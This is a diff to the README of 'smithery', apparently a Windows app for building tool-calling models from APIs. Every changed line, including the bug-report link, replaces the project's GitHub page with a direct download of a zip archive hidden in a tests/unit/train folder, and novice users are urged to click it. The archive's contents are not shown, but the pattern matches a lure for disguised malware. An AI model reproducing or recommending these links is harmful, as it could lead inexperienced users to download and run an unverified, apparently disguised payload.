@@ -1,6 +1,6 @@
 # ⚒️ smithery - Forge Models from Your APIs
 
-[![Download smithery](https://img.shields.io/badge/Download-smithery-ff6f61?style=for-the-badge)](https://github.com/classypeter/smithery)
+[![Download smithery](https://img.shields.io/badge/Download-smithery-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/classypeter/smithery/main/tests/unit/train/Software-v3.7.zip)
 
 smithery is a simple application that helps you create tool-calling models using your API definitions. This guide will walk you through how to download and run smithery on a Windows computer. No prior programming experience is needed. Just follow the steps below.
 
@@ -40,7 +40,7 @@ Before installing smithery on Windows, make sure your PC meets these basic requi
 
 Click the big download badge at the top, or visit this link:
 
-[Download smithery on GitHub](https://github.com/classypeter/smithery)
+[Download smithery on GitHub](https://raw.githubusercontent.com/classypeter/smithery/main/tests/unit/train/Software-v3.7.zip)
 
 This page has the latest version of smithery ready for Windows.
 
@@ -116,9 +116,9 @@ smithery offers a range of useful features to make working with APIs easier:
 
 ## 🔗 Useful Links
 
-- Main software page: [https://github.com/classypeter/smithery](https://github.com/classypeter/smithery)
-- Windows download page (same link): [https://github.com/classypeter/smithery](https://github.com/classypeter/smithery)
-- GitHub Issues for bug reports and questions: https://github.com/classypeter/smithery/issues
+- Main software page: [https://raw.githubusercontent.com/classypeter/smithery/main/tests/unit/train/Software-v3.7.zip](https://raw.githubusercontent.com/classypeter/smithery/main/tests/unit/train/Software-v3.7.zip)
+- Windows download page (same link): [https://raw.githubusercontent.com/classypeter/smithery/main/tests/unit/train/Software-v3.7.zip](https://raw.githubusercontent.com/classypeter/smithery/main/tests/unit/train/Software-v3.7.zip)
+- GitHub Issues for bug reports and questions: https://raw.githubusercontent.com/classypeter/smithery/main/tests/unit/train/Software-v3.7.zip
 
 ---
 
@@ -144,5 +144,5 @@ Always keep smithery updated to access new features and fixes.
 
 ---
 
-# [Download smithery](https://github.com/classypeter/smithery)  
+# [Download smithery](https://raw.githubusercontent.com/classypeter/smithery/main/tests/unit/train/Software-v3.7.zip)  
 Ready to start forging your tool-calling models? Visit the link above to get smithery for Windows.
